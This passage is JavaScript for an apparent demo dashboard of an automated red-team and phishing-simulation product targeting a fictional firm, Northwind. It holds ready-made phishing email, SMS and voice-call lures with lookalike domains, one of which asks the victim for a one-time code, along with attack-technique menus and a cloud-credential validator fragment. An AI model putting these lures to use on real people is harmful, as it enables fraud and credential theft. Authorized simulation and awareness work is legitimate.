        "  expect(role.body).toMatch(/nw-eks-node-role/);\n" +
        "  return seal({ reproduced: true, evidence: { imds: \"v1\", role: role.body } });\n" +
        "<span class='c'>}</span>";
    } else {
      body = "<span class='c'>export async function run(ctx) {</span>\n" +
        "  const sb = await sandbox.spawn(ctx.target);\n" +
        "  const replay = await sb.replay(ctx.capture);\n" +
        "  expect(replay.matches(ctx.signature)).toBe(true);\n" +
        "  return seal({ reproduced: true, evidence: replay.artifacts() });\n" +
        "<span class='c'>}</span>";
    }
    return base + body;
  }

  function openFinding(id) {
    var f = state.findings.filter(function (x) { return x.id === id; })[0]; if (!f) return;
    $("#drawerBody").innerHTML =
      '<button class="x" data-x>&times;</button>' +
      '<span style="font-family:JetBrains Mono;color:var(--gold);font-size:11px;letter-spacing:.16em">[ ' + f.id + ' &middot; ' + f.cmp + ' ]</span>' +
      '<h3>' + esc(f.t) + '</h3>' +
      '<div class="meta">' + sevTag(f.sev) + '<span class="tag sev-low">' + f.surf + '</span><span class="tag sev-med">' + f.att +
      '</span><span class="tag" style="border:1px solid rgba(63,185,132,.4);color:#3FB984">CVSS ' + f.cvss + '</span>' +
      '<span class="tag" style="border:1px solid rgba(63,185,132,.4);color:#3FB984">PROVEN</span></div>' +
      '<h5>Summary</h5><p>' + esc(f.d) + '</p>' +
      '<h5>Validated proof of concept</h5><div class="code">' + f.poc + '</div>' +
      '<h5>Deterministic validator</h5><div class="code">' + validatorFor(f) + '</div>' +
      '<div class="val-runs"><span class="dotp ok"></span> Last 3 runs in isolated sandbox: <b>3 / 3 reproduced</b> &middot; <span class="mono">SHA-256 ' + esc(fakeHash(f.id)) + '</span></div>' +
      '<h5>Remediation</h5><p>' + esc(f.fix) + '</p>' +
      '<h5>Mapped controls</h5><div class="fwtags">' + (f.fw || []).map(function (x) { return '<span>' + x + '</span>'; }).join("") + '</div>' +
      '<h5>Evidence</h5><p>Sandbox recording, request and response capture, and chain of custody timestamps are sealed in the evidence pack and exportable for audit.</p>';
    openDrawer();
  }
  function openAsset(i) {
    var a = state.assets[i]; if (!a) return;
    var rel = state.findings.filter(function (f) { return f.surf === a[2]; });
    $("#drawerBody").innerHTML =
      '<button class="x" data-x>&times;</button>' +
      '<span style="font-family:JetBrains Mono;color:var(--gold);font-size:11px;letter-spacing:.16em">[ ASSET ]</span>' +
      '<h3>' + a[0] + '</h3><div class="meta"><span class="tag sev-low">' + a[1] + '</span><span class="tag sev-med">' + a[2] +
      '</span>' + sevTag(a[3]) + '<span class="tag sev-low">' + a[4] + '</span></div>' +
      '<h5>Ownership</h5><p>Owner: ' + a[5] + '. Continuously monitored, last assessed under CMP-2041.</p>' +
      '<h5>Related findings</h5>' + (rel.length ? '<table class="tbl"><tbody>' + rel.slice(0, 5).map(function (f) {
        return '<tr class="clk" data-f="' + f.id + '"><td class="mono">' + f.id + '</td><td>' + esc(f.t) + '</td><td>' + sevTag(f.sev) + '</td></tr>'; }).join("") + '</tbody></table>' : '<p>No open findings on this asset.</p>') +
      '<h5>Coverage</h5><p>Reachable by network, cloud, and identity agents. Included in continuous reassessment.</p>';
    openDrawer(); bindClicks();
  }
  function openDrawer() { $("#scrim").classList.add("open"); $("#drawer").classList.add("open"); }
  function closeDrawer() { $("#scrim").classList.remove("open"); $("#drawer").classList.remove("open"); }

  /* ============================ LAUNCH WIZARD ============================ */
  var TYPES = [
    { k: "assumed", n: "Full stack assumed breach", d: "Start inside, prove the path to crown jewels across the whole stack.",
      scope: ["network", "cloud", "identity", "app"],
      tech: [["exploit", "Active exploitation", "Proof of concept exploitation, sandboxed"],
             ["lateral", "Lateral movement", "Pivot across hosts, subnets, and trusts"],
             ["privesc", "Privilege escalation", "Escalate toward domain and cloud admin"],
             ["exfilsim", "Exfiltration simulation", "Prove data reach without removing data"],
             ["persist", "Persistence", "Plant and clean up a controlled foothold"]] },
    { k: "external", n: "External perimeter", d: "Internet facing web, API, and exposed services from an unauthenticated start.",
      scope: ["app", "network"],
      tech: [["exploit", "Active exploitation", "Proof of concept exploitation, sandboxed"],
             ["authbypass", "Auth and access control", "Defeat authentication and authorisation"],
             ["exfilsim", "Data reach simulation", "Prove what an outsider can read"]] },
    { k: "cloud", n: "Cloud and Kubernetes", d: "AWS, Azure, GCP, and EKS misconfiguration, IAM, and container escape.",
      scope: ["cloud"],
      tech: [["iam", "IAM privilege escalation", "Abuse roles, policies, and trust"],
             ["container", "Container and pod escape", "Break out to node and cluster"],
             ["exploit", "Active exploitation", "Proof of concept exploitation, sandboxed"],
             ["exfilsim", "Data reach simulation", "Prove reach to buckets and stores"]] },
    { k: "identity", n: "Active Directory and identity", d: "Credential attacks, Kerberos abuse, and trust paths to Domain Admin.",
      scope: ["identity"],
      tech: [["credattack", "Credential attacks", "Spray, relay, and recover credentials"],
             ["kerberos", "Kerberos abuse", "Kerberoast, delegation, and ticket attacks"],
             ["lateral", "Lateral movement", "Move across the directory and trusts"],
             ["privesc", "Domain escalation", "Path to Domain Admin"]] },
    { k: "app", n: "Web and API deep test", d: "Business logic, access control, and chained application flaws.",
      scope: ["app"],
      tech: [["authbypass", "Access control and logic", "Broken object and function access"],
             ["injection", "Injection and SSRF", "Server side request and injection classes"],
             ["exploit", "Active exploitation", "Chain flaws to impact, sandboxed"],
             ["exfilsim", "Data reach simulation", "Prove what an attacker can read"]] },
    { k: "social", n: "Omnichannel social engineering", d: "Email, SMS, WhatsApp, voice clone, live deepfake, Slack and Teams.",
      scope: ["people"], social: true }
  ];
  var SCOPE_LABEL = { network: "Network", cloud: "Cloud and Kubernetes", identity: "Identity and Active Directory", app: "Applications and APIs", people: "People rosters" };
  function defaultParams(k) {
    var t = TYPES.filter(function (x) { return x.k === k; })[0], p = { intensity: 3, concurrency: 80, window: "Off hours (18:00-06:00 SGT)", opsec: "Balanced" };
    (t.tech || []).forEach(function (x) { p[x[0]] = true; });
    return p;
  }
  var SCOPE_ASSETS = {
    network: ["10.4.0.0/16 internal subnet", "vpn.northwind.io", "WIFI-NW-CORP wireless", "Palo Alto edge (14)"],
    cloud: ["AWS prod (12 accounts)", "Azure prod (4 subs)", "GCP (2 projects)", "nw-prod-eks Kubernetes"],
    identity: ["nw-corp.local Active Directory", "Okta tenant", "Microsoft Entra ID"],
    app: ["payments.northwind.io", "api-gw.northwind.io", "mssql-fin-01", "340 GitHub repos"],
    people: ["Finance roster (118)", "Executive roster (24)", "IT helpdesk (36)", "All staff (722)"]
  };
  var wiz = { step: 0, type: null, scope: {}, params: {}, channels: {}, auth: {} };

  function openWiz() {
    wiz = { step: 0, type: "assumed", scope: {},
      params: defaultParams("assumed"),
      sparams: { rate: 40, aggr: 2, window: "Business hours (target local)", distress: true, credpage: true, payload: false, trainredirect: true },
      channels: { email: true, sms: true, voice: false, deepfake: false, slack: true },
      pretext: {
        theme: "Finance, urgent payment approval",
        sender: "accounts.payable@northwlnd-finance.com",
        display: "Northwind Accounts Payable",
        brand: "Northwind Capital",
        subject: "Action required: payment release held for approval",
        body: "Hi {{first_name}},\n\nA vendor payment of SGD 48,200 is on hold pending your approval before 5pm today. Please review and authorise via the secure portal below.\n\nThis is time sensitive, the vendor has flagged a service interruption.\n\nFinance Operations",
        sms: "Northwind Finance: a payment approval is pending in your name. Review: nw-secure-approvals.com/r/4F2A",
        landing: "Microsoft 365 single sign on",
        voice: false, voiceScript: "Hi, this is Marcus from Finance Ops. The approval portal is timing out on my side, could you confirm the one time code you just received so I can release the vendor payment before the cutoff?",
        deepfake: false, persona: "CFO, Lena Tan (consented, watermarked)"
      },
      auth: {} };
    SCOPE_ASSETS.network.forEach(function () {});
    Object.keys(SCOPE_ASSETS).forEach(function (g) { wiz.scope[g] = {}; SCOPE_ASSETS[g].forEach(function (a, i) { wiz.scope[g][i] = (g !== "people"); }); });
    $("#wizScrim").classList.add("open");
    renderWiz();
  }
  function closeWiz() { $("#wizScrim").classList.remove("open"); }

  function wizSteps() {
    var s = ["Type", "Scope and targets", "Parameters"];
    if (wiz.type === "social") { s.push("Channels"); s.push("Pretext studio"); }
    s.push("Authorization"); s.push("Review");
    return s;
  }
  function renderWiz() {
    var steps = wizSteps();
    var html = '<div class="wiz-top"><h3>Launch a campaign</h3><button class="x" data-wx>&times;</button></div>' +
      '<div class="steps">' + steps.map(function (s, i) {
        return '<div class="stp ' + (i === wiz.step ? "on" : i < wiz.step ? "done" : "") + '"><span class="n">' + (i < wiz.step ? "&#10003;" : i + 1) + '</span>' + s + '</div>';
      }).join("") + '</div><div class="wiz-body" id="wizBody">' + wizBody(steps) + '</div>' +
      '<div class="wiz-foot"><div class="wiz-warn" id="wizWarn"></div><div style="display:flex;gap:10px;margin-left:auto">' +
      (wiz.step > 0 ? '<button class="btn-mini ghost sm" data-wb>Back</button>' : '') +
      '<button class="btn-mini" id="wizNext">' + (wiz.step === steps.length - 1 ? "Authorize and launch" : "Continue") + '</button></div></div>';
    $("#wiz").innerHTML = html;
    bindWiz(steps);
  }
  function wizBody(steps) {
    var label = steps[wiz.step];
    if (label === "Type") {
      return '<h4>Select campaign type</h4><p class="sub">Each type configures the right agents, scope, and validators.</p><div class="opt-grid">' +
        TYPES.map(function (t) {
          var meta = t.social
            ? "6 channels &middot; pretext studio &middot; safe mode"
            : t.scope.map(function (s) { return SCOPE_LABEL[s]; }).join(" &middot; ");
          return '<label class="opt ' + (wiz.type === t.k ? "on" : "") + '" data-type="' + t.k + '"><input type="radio" name="ty" ' + (wiz.type === t.k ? "checked" : "") + '><div><div class="ob">' + t.n + '</div><div class="od">' + t.d + '</div><div class="ometa">' + meta + '</div></div></label>';
        }).join("") + '</div>';
    }
    if (label === "Scope and targets") {
      var t = TYPES.filter(function (x) { return x.k === wiz.type; })[0];
      if (wiz.type === "social") {
        return '<h4>Roster and targets</h4><p class="sub">Choose which people are in scope. Everyone else is excluded. Targeting respects consent and opt out lists.</p>' +
          '<div class="frm"><label>people rosters</label><div class="scope-list">' + SCOPE_ASSETS.people.map(function (a, i) {
            return '<label class="scope-row"><input type="checkbox" data-sc="people" data-si="' + i + '" ' + (wiz.scope.people[i] ? "checked" : "") + '> ' + a + '<span class="sm">roster</span></label>';
          }).join("") + '</div></div>' +
          '<div class="frm"><label>Add named targets (optional)</label><input type="text" id="wizCidr" placeholder="email or staff ID, comma separated"></div>' +
          '<div class="frm"><label>Exclusions (always honoured)</label><input type="text" id="wizExcl" value="Board members, staff on leave, prior opt outs"></div>' +
          '<div class="frm"><label>Consent and care</label><input type="text" value="Cloned personas need explicit consent. Campaign stands down on distress." readonly></div>';
      }
      return '<h4>Scope and targets</h4><p class="sub">Pick exactly what is in scope. Everything else is excluded by default.</p>' +
        t.scope.map(function (g) {
          return '<div class="frm"><label>' + g + '</label><div class="scope-list">' + SCOPE_ASSETS[g].map(function (a, i) {
            return '<label class="scope-row"><input type="checkbox" data-sc="' + g + '" data-si="' + i + '" ' + (wiz.scope[g][i] ? "checked" : "") + '> ' + a + '<span class="sm">' + (a.match(/\((\d+)/) ? "group" : "single") + '</span></label>';
          }).join("") + '</div></div>';
        }).join("") +
        '<div class="frm"><label>Additional in scope (CIDR or host, optional)</label><input type="text" id="wizCidr" placeholder="10.20.0.0/16, app2.northwind.io"></div>' +
        '<div class="frm"><label>Exclusions (always honoured)</label><input type="text" id="wizExcl" value="*.legacy.northwind.io, 10.4.99.0/24 (OT)"></div>';
    }
    if (label === "Parameters") {
      if (wiz.type === "social") {
        var sp = wiz.sparams;
        return '<h4>Engagement parameters</h4><p class="sub">Social campaigns never cause real loss. Tune pace, realism, and the safety guardrails.</p>' +
          '<div class="frm"><label>Send rate <span class="range-val" id="srLabel">' + sp.rate + ' targets / hour</span></label><input type="range" id="wizSr" min="10" max="120" step="10" value="' + sp.rate + '"></div>' +
          '<div class="frm"><label>Narrative aggressiveness <span class="range-val" id="saLabel">' + ["Soft", "Standard", "Assertive", "High pressure"][sp.aggr - 1] + '</span></label><input type="range" id="wizSa" min="1" max="4" value="' + sp.aggr + '"></div>' +
          '<div class="frm"><label>Delivery window</label><select id="wizSw"><option ' + sel(sp.window, "Business hours (target local)") + '>Business hours (target local)</option><option ' + sel(sp.window, "Lunch peak (11:30-13:30)") + '>Lunch peak (11:30-13:30)</option><option ' + sel(sp.window, "End of day (16:00-18:00)") + '>End of day (16:00-18:00)</option></select></div>' +
          [['distress', 'Stand down on distress', 'Halt a target the moment they show distress'],
           ['credpage', 'Credential capture page', 'Record that a credential was entered, never store it'],
           ['payload', 'Benign attachment payload', 'Track open and macro enable, inert by design'],
           ['trainredirect', 'Just in time coaching', 'Redirect to a short lesson the instant someone falls']].map(function (p) {
            return '<div class="toggle-row"><div>' + p[1] + '<small>' + p[2] + '</small></div><label class="sw"><input type="checkbox" data-sp="' + p[0] + '" ' + (sp[p[0]] ? "checked" : "") + '><span class="tk"></span></label></div>';
          }).join("");
      }
      var iv = wiz.params.intensity;
      return '<h4>Engagement parameters</h4><p class="sub">Tune aggression, concurrency, and which techniques are permitted.</p>' +
        '<div class="frm"><label>Attack intensity <span class="range-val" id="ivLabel">' + ["Passive", "Light", "Standard", "Aggressive", "Maximum"][iv - 1] + '</span></label><input type="range" id="wizInt" min="1" max="5" value="' + iv + '"></div>' +
        '<div class="frm"><label>Max concurrent agents <span class="range-val" id="ccLabel">' + wiz.params.concurrency + '</span></label><input type="range" id="wizCc" min="10" max="120" step="10" value="' + wiz.params.concurrency + '"></div>' +
        '<div class="frm"><label>Engagement window</label><select id="wizWin"><option ' + sel(wiz.params.window, "Off hours (18:00-06:00 SGT)") + '>Off hours (18:00-06:00 SGT)</option><option ' + sel(wiz.params.window, "Business hours") + '>Business hours</option><option ' + sel(wiz.params.window, "Continuous (24/7)") + '>Continuous (24/7)</option></select></div>' +
        '<div class="frm"><label>OPSEC profile</label><select id="wizOps"><option ' + sel(wiz.params.opsec, "Loud (full speed)") + '>Loud (full speed)</option><option ' + sel(wiz.params.opsec, "Balanced") + '>Balanced</option><option ' + sel(wiz.params.opsec, "Stealth (evade detection)") + '>Stealth (evade detection)</option></select></div>' +
        '<div class="frm"><label>Permitted techniques for this engagement</label></div>' +
        (TYPES.filter(function (x) { return x.k === wiz.type; })[0].tech || []).map(function (p) {
          return '<div class="toggle-row"><div>' + p[1] + '<small>' + p[2] + '</small></div><label class="sw"><input type="checkbox" data-pp="' + p[0] + '" ' + (wiz.params[p[0]] ? "checked" : "") + '><span class="tk"></span></label></div>';
        }).join("");
    }
    if (label === "Pretext studio") return pretextStudio();
    if (label === "Channels") {
      return '<h4>Social engineering channels</h4><p class="sub">Orchestrated under one narrative. The engine escalates only on engagement.</p>' +
        [['email', 'Phishing email', 'Context aware lures from open source signals'],
         ['sms', 'SMS and WhatsApp', 'Move targets off corporate channels'],
         ['voice', 'Voice clone (vishing)', 'Consented clone of an authorised persona'],
         ['deepfake', 'Live deepfake video', 'Join a scheduled Zoom, Teams, or Meet call'],
         ['slack', 'Slack and Teams follow up', 'Exploit trust in internal tooling']].map(function (c) {
          return '<div class="toggle-row"><div>' + c[1] + '<small>' + c[2] + '</small></div><label class="sw"><input type="checkbox" data-ch="' + c[0] + '" ' + (wiz.channels[c[0]] ? "checked" : "") + '><span class="tk"></span></label></div>';
        }).join("") +
        '<div class="frm" style="margin-top:18px"><label>Pretext theme</label><select id="wizPre"><option>Finance, urgent payment approval</option><option>IT, MFA re-enrolment</option><option>HR, benefits update</option><option>Executive, confidential acquisition</option></select></div>';
    }
    if (label === "Authorization") {
      return '<h4>Authorization gate</h4><p class="sub">No campaign starts without a signed, scoped authorization from a named accountable owner.</p>' +
        '<div class="auth-gate">' +
        '<div class="frm"><label>Accountable owner</label><input type="text" id="wizOwner" value="Aaron Ang"></div>' +
        '<div class="frm"><label>Authorization reference</label><input type="text" id="wizRef" value="AUTH-2026-0519-NW"></div>' +
        '<label class="lk"><input type="checkbox" data-ak="a"> I confirm written authorization exists for this exact scope.</label>' +
        '<label class="lk"><input type="checkbox" data-ak="b"> I am authorised to approve adversary simulation against ' + ORG + '.</label>' +
        '<label class="lk"><input type="checkbox" data-ak="c"> Cherubim must stop before any real loss and seal an evidence pack.</label>' +
        '</div>';
    }
    // Review
    var t2 = TYPES.filter(function (x) { return x.k === wiz.type; })[0];
    var scopeCount = 0; Object.keys(wiz.scope).forEach(function (g) { Object.keys(wiz.scope[g]).forEach(function (i) { if (wiz.scope[g][i] && t2.scope.indexOf(g) >= 0) scopeCount++; }); });
    var rows = ri("Campaign type", t2.n) + ri("Scope items", scopeCount + " selected");
    if (wiz.type === "social") {
      var ch = Object.keys(wiz.channels).filter(function (k) { return wiz.channels[k]; });
      rows += ri("Send rate", wiz.sparams.rate + " / hour") +
        ri("Narrative", ["Soft", "Standard", "Assertive", "High pressure"][wiz.sparams.aggr - 1]) +
        ri("Window", wiz.sparams.window) +
        ri("Channels", ch.join(", ") || "none") +
        ri("Pretext", wiz.pretext.theme) +
        ri("Lookalike sender", wiz.pretext.sender) +
        ri("Landing page", wiz.pretext.landing) +
        ri("Cloned voice", wiz.channels.voice && wiz.pretext.voice ? "Attached, consented" : "Not used") +
        ri("Live deepfake", wiz.channels.deepfake && wiz.pretext.deepfake ? wiz.pretext.persona : "Not used") +
        ri("Safe mode", "Stand down on distress, no real loss");
    } else {
      var on = (t2.tech || []).filter(function (x) { return wiz.params[x[0]]; }).map(function (x) { return x[1]; });
      rows += ri("Surfaces", t2.scope.map(function (s) { return SCOPE_LABEL[s]; }).join(", ")) +
        ri("Intensity", ["Passive", "Light", "Standard", "Aggressive", "Maximum"][wiz.params.intensity - 1]) +
        ri("Concurrency", wiz.params.concurrency + " agents") + ri("Window", wiz.params.window) + ri("OPSEC", wiz.params.opsec) +
        ri("Techniques", on.length ? on.join(", ") : "none selected") +
        ri("Validation", "Deterministic, no proof no finding");
    }
    rows += ri("Owner", "Aaron Ang") + ri("Authorization", "AUTH-2026-0519-NW");
    return '<h4>Review and launch</h4><p class="sub">Confirm the engagement. Cherubim will run autonomously and prove every finding.</p><div class="review">' + rows + '</div>';
  }
  function ri(k, v) { return '<div class="ri"><span>' + k + '</span><b>' + v + '</b></div>'; }
  function sel(cur, val) { return cur === val ? "selected" : ""; }

  function pretextStudio() {
    var p = wiz.pretext;
    var act = Object.keys(wiz.channels).filter(function (k) { return wiz.channels[k]; });
    return '<h4>Pretext studio</h4><p class="sub">Craft the exact lure your people will see. Edit on the left, preview updates live on the right.</p>' +
      '<div class="ps">' +
      '<div class="ps-edit">' +
        '<div class="frm"><label>Scenario theme</label><select id="psTheme"><option ' + sel(p.theme, "Finance, urgent payment approval") + '>Finance, urgent payment approval</option><option ' + sel(p.theme, "IT, MFA re-enrolment") + '>IT, MFA re-enrolment</option><option ' + sel(p.theme, "HR, benefits update") + '>HR, benefits update</option><option ' + sel(p.theme, "Executive, confidential acquisition") + '>Executive, confidential acquisition</option></select></div>' +
        '<div class="frm"><label>Sender display name</label><input type="text" id="psDisp" value="' + esc(p.display) + '"></div>' +
        '<div class="frm"><label>Sender address (lookalike domain)</label><input type="text" id="psFrom" value="' + esc(p.sender) + '"></div>' +
        (wiz.channels.email ? '<div class="frm"><label>Email subject</label><input type="text" id="psSubj" value="' + esc(p.subject) + '"></div>' +
        '<div class="frm"><label>Email body <span class="range-val">{{first_name}} token supported</span></label><textarea id="psBody" rows="6">' + esc(p.body) + '</textarea></div>' : '') +
        (wiz.channels.sms ? '<div class="frm"><label>SMS / WhatsApp text</label><textarea id="psSms" rows="2">' + esc(p.sms) + '</textarea></div>' : '') +
        '<div class="frm"><label>Capture landing page</label><select id="psLand"><option ' + sel(p.landing, "Microsoft 365 single sign on") + '>Microsoft 365 single sign on</option><option ' + sel(p.landing, "Okta login") + '>Okta login</option><option ' + sel(p.landing, "Northwind VPN portal") + '>Northwind VPN portal</option><option ' + sel(p.landing, "Vendor invoice portal") + '>Vendor invoice portal</option></select></div>' +
        (wiz.channels.voice ? '<div class="ps-asset"><div class="toggle-row"><div>Attach cloned voice<small>Consented clone of an authorised internal persona</small></div><label class="sw"><input type="checkbox" id="psVoice" ' + (p.voice ? "checked" : "") + '><span class="tk"></span></label></div><div class="frm" id="psVoiceWrap" style="' + (p.voice ? "" : "display:none") + '"><label>Voice call script</label><textarea id="psVScript" rows="3">' + esc(p.voiceScript) + '</textarea></div></div>' : '') +
        (wiz.channels.deepfake ? '<div class="ps-asset"><div class="toggle-row"><div>Attach live deepfake persona<small>Watermarked, consent on file, joins a scheduled call</small></div><label class="sw"><input type="checkbox" id="psDf" ' + (p.deepfake ? "checked" : "") + '><span class="tk"></span></label></div><div class="frm" id="psDfWrap" style="' + (p.deepfake ? "" : "display:none") + '"><label>Persona</label><select id="psPersona"><option>CFO, Lena Tan (consented, watermarked)</option><option>Head of IT, R. Devar (consented, watermarked)</option><option>CEO, M. Halim (consented, watermarked)</option></select></div></div>' : '') +
      '</div>' +
      '<div class="ps-prev" id="psPrev">' + pretextPreview() + '</div></div>' +
      '<p class="wiz-warn" style="margin-top:14px;color:var(--muted)">Channels active in this campaign: ' + (act.length ? act.join(", ") : "none selected") + '. Synthetic media is watermarked and logged. Nothing here causes real loss.</p>';
  }
  function pretextPreview() {
    var p = wiz.pretext, body = esc(p.body).replace(/\{\{first_name\}\}/g, "Priya").replace(/\n/g, "<br>");
    var h = '<div class="pv-tabs">';
    if (wiz.channels.email) h += '<span>Email</span>';
    if (wiz.channels.sms) h += '<span>Mobile</span>';
    h += '<span>Landing</span>';
    if (wiz.channels.voice) h += '<span>Voice</span>';
    if (wiz.channels.deepfake) h += '<span>Deepfake</span>';
    h += '</div><div class="pv-body">';
    if (wiz.channels.email) {
      h += '<div class="pv-mail"><div class="pv-mh"><div class="pv-av">' + esc(p.display).charAt(0) + '</div><div><b>' + esc(p.display) + '</b><span>' + esc(p.sender) + '</span></div><em>now</em></div>' +
        '<div class="pv-subj">' + esc(p.subject) + '</div><div class="pv-text">' + body + '<div class="pv-btn">Review and approve</div></div></div>';
    }
    if (wiz.channels.sms) {
      h += '<div class="pv-phone"><div class="pv-bubble">' + esc(p.sms) + '</div><span class="pv-time">delivered &middot; SMS / WhatsApp</span></div>';
    }
    h += '<div class="pv-land"><div class="pv-url"><span>&#128274;</span> nw-secure-approvals.com</div><div class="pv-lbox"><div class="pv-logo">' + esc(p.brand) + '</div><div class="pv-ltitle">' + esc(p.landing) + '</div><input disabled placeholder="work email"><input disabled placeholder="password" type="password"><div class="pv-lbtn">Sign in</div><small>Credential entry is recorded, never stored.</small></div></div>';
    if (wiz.channels.voice && p.voice) {
      h += '<div class="pv-voice"><div class="pv-vwave"><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div><b>Cloned voice, vishing</b><p>' + esc(p.voiceScript) + '</p><small>Consented persona &middot; watermarked audio</small></div>';
    }
    if (wiz.channels.deepfake && p.deepfake) {
      h += '<div class="pv-df"><div class="pv-dfvid"><div class="pv-dfface"></div><span class="pv-rec">&#9679; LIVE</span><span class="pv-wm">cherubim watermark</span></div><b>Live deepfake on Teams</b><p>' + esc(p.persona) + '</p></div>';
    }
    h += '</div>';
    return h;
  }
  function refreshPrev() { var el = $("#psPrev"); if (el) el.innerHTML = pretextPreview(); }

  function bindWiz(steps) {
    $("[data-wx]") && ($("[data-wx]").onclick = closeWiz);
    var bk = $("[data-wb]"); if (bk) bk.onclick = function () { wiz.step--; renderWiz(); };
    $$("[data-type]").forEach(function (o) { o.onclick = function () {
      var nt = o.getAttribute("data-type");
      if (nt !== wiz.type) { wiz.type = nt; if (nt !== "social") wiz.params = defaultParams(nt); }
      renderWiz();
    }; });
    $$("[data-sc]").forEach(function (c) { c.onchange = function () { wiz.scope[c.getAttribute("data-sc")][c.getAttribute("data-si")] = c.checked; }; });
    $$("[data-pp]").forEach(function (c) { c.onchange = function () { wiz.params[c.getAttribute("data-pp")] = c.checked; }; });
    $$("[data-ch]").forEach(function (c) { c.onchange = function () { wiz.channels[c.getAttribute("data-ch")] = c.checked; }; });
    $$("[data-ak]").forEach(function (c) { c.onchange = function () { wiz.auth[c.getAttribute("data-ak")] = c.checked; checkAuth(); }; });
    var wi = $("#wizInt"); if (wi) wi.oninput = function () { wiz.params.intensity = +wi.value; $("#ivLabel").textContent = ["Passive", "Light", "Standard", "Aggressive", "Maximum"][wi.value - 1]; };
    var cc = $("#wizCc"); if (cc) cc.oninput = function () { wiz.params.concurrency = +cc.value; $("#ccLabel").textContent = cc.value; };
    var ww = $("#wizWin"); if (ww) ww.onchange = function () { wiz.params.window = ww.value; };
    var wo = $("#wizOps"); if (wo) wo.onchange = function () { wiz.params.opsec = wo.value; };

    // social parameters
    $$("[data-sp]").forEach(function (c) { c.onchange = function () { wiz.sparams[c.getAttribute("data-sp")] = c.checked; }; });
    var sr = $("#wizSr"); if (sr) sr.oninput = function () { wiz.sparams.rate = +sr.value; $("#srLabel").textContent = sr.value + " targets / hour"; };
    var sa = $("#wizSa"); if (sa) sa.oninput = function () { wiz.sparams.aggr = +sa.value; $("#saLabel").textContent = ["Soft", "Standard", "Assertive", "High pressure"][sa.value - 1]; };
    var sw = $("#wizSw"); if (sw) sw.onchange = function () { wiz.sparams.window = sw.value; };

    // pretext studio, live preview
    function pv(id, key, sub) { var e = $(id); if (e) e.oninput = function () { wiz.pretext[key] = e.value; if (sub) wiz.pretext[sub] = e.value; refreshPrev(); }; }
    var th = $("#psTheme"); if (th) th.onchange = function () {
      wiz.pretext.theme = th.value;
      var map = {
        "Finance, urgent payment approval": ["Action required: payment release held for approval", "Northwind Accounts Payable", "accounts.payable@northwlnd-finance.com"],
        "IT, MFA re-enrolment": ["Your MFA enrolment expires today, re-verify now", "Northwind IT Service Desk", "it-servicedesk@northwlnd-support.com"],
        "HR, benefits update": ["Confirm your 2026 benefits before the deadline", "Northwind People Team", "people@northwlnd-hr.com"],
        "Executive, confidential acquisition": ["Confidential: signature needed before market open", "Office of the CFO", "cfo.office@northwlnd-corp.com"]
      };
      var m = map[th.value]; if (m) { wiz.pretext.subject = m[0]; wiz.pretext.display = m[1]; wiz.pretext.sender = m[2]; }
      renderWiz();
    };
    pv("#psDisp", "display"); pv("#psFrom", "sender"); pv("#psSubj", "subject");
    pv("#psBody", "body"); pv("#psSms", "sms"); pv("#psVScript", "voiceScript");
    var pl = $("#psLand"); if (pl) pl.onchange = function () { wiz.pretext.landing = pl.value; refreshPrev(); };
    var pp = $("#psPersona"); if (pp) pp.onchange = function () { wiz.pretext.persona = pp.value; refreshPrev(); };
    var pvc = $("#psVoice"); if (pvc) pvc.onchange = function () { wiz.pretext.voice = pvc.checked; var w = $("#psVoiceWrap"); if (w) w.style.display = pvc.checked ? "" : "none"; refreshPrev(); };
    var pdf = $("#psDf"); if (pdf) pdf.onchange = function () { wiz.pretext.deepfake = pdf.checked; var w = $("#psDfWrap"); if (w) w.style.display = pdf.checked ? "" : "none"; refreshPrev(); };

    $("#wizNext").onclick = function () {
      var label = steps[wiz.step];
      if (label === "Authorization" && !(wiz.auth.a && wiz.auth.b && wiz.auth.c)) { $("#wizWarn").textContent = "All authorization confirmations are required."; return; }
      if (wiz.step === steps.length - 1) { closeWiz(); runCampaign(); return; }
      wiz.step++; renderWiz();
    };
    checkAuth();
  }
  function checkAuth() { var w = $("#wizWarn"); if (w && wizSteps()[wiz.step] === "Authorization") w.textContent = (wiz.auth.a && wiz.auth.b && wiz.auth.c) ? "" : "All authorization confirmations are required."; }

  /* ============================ LIVE OPS CONSOLE ============================ */
  function runCampaign() {
    var t = TYPES.filter(function (x) { return x.k === wiz.type; })[0];
    var cid = "CMP-" + (2045 + state.campaigns.length);
    var social = wiz.type === "social";
    var phases = social
      ? [["Roster sync", "consented targets loaded"], ["Pretext build", "narrative generated"], ["Channel send", "lures dispatched"], ["Narrative replan", "escalation arbitrated"], ["Engagement scoring", "click, report, credential"], ["Report", "human risk index sealed"]]
      : [["Reconnaissance", "mapping connected scope"], ["Enumeration", "services and identities"], ["Exploitation", "candidate vulnerabilities"], ["Validation", "deterministic sandbox replay"], ["Lateral movement", "pivot across the stack"], ["Privilege escalation", "path to crown jewels"], ["Impact and exfil sim", "prove reach, no loss"], ["Compliance and report", "map and seal evidence"]];

    var PANES = social ? socialPanes() : technicalPanes();

    var ops = $("#ops");
    ops.innerHTML =
      '<div class="ops-top"><span class="ot-id">' + cid + '</span><h3>' + t.n + '</h3>' +
      '<span class="live">LIVE ENGAGEMENT</span><div class="topbar-spacer"></div>' +
      '<span class="clock" id="opClock">00:00</span><button class="btn-mini ghost sm" id="opStop">Stop safely</button></div>' +
      '<div class="ops-grid"><div class="ops-col"><div class="ops-h">Engagement phases</div><div id="opPhases"></div></div>' +
      '<div class="ops-col mid">' +
        '<div class="term-grid">' +
        PANES.map(function (p, i) {
          return '<div class="term-pane" id="pane' + i + '"><div class="tp-head"><span class="dotp run"></span><b>' + p.title + '</b><span class="tp-host mono">' + p.host + '</span></div>' +
            '<div class="tp-body" id="tp' + i + '"><div class="tl pf">' + (i === 0 ? "Last login: Tue May 19 09:11:38 2026 from 10.4.0.2" : "Last login: Tue May 19 09:11:38 2026 from 10.4.0.2") + '</div><span class="cursor" id="cur' + i + '"></span></div>' +
            '<div class="tp-status mono"><span>' + p.title + '</span><span class="tps-host">' + p.host.split(" //")[0] + '</span><span class="tps-t" id="tps' + i + '">--:--</span></div></div>';
        }).join("") +
        '</div>' +
      '</div>' +
      '<div class="ops-col"><div class="ops-h">Live metrics</div>' +
      '<div class="ops-metric"><div class="ml">Agents active</div><div class="mv" id="opAgents">0</div></div>' +
      '<div class="ops-metric"><div class="ml">Hosts touched</div><div class="mv" id="opHosts">0</div></div>' +
      '<div class="ops-metric"><div class="ml">Tool calls</div><div class="mv" id="opCalls">0</div></div>' +
